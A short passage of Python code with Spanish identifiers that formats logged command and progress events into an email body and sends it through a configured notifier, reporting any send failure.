                cuerpo.append(f"  [{e['ts']}] $ {e['contenido'][:200]}")
            elif e["tipo"] == "progreso":
                cuerpo.append(f"  [{e['ts']}] [{e.get('fase', '?')}] {e['contenido'][:200]}")
        ok, msg = notify.send_email(cfg, asunto, "\n".join(cuerpo))
        run.say(f"  [correo] {msg}")
    except Exception as e:
        run.say(f"  [correo] no se pudo enviar: {e}")
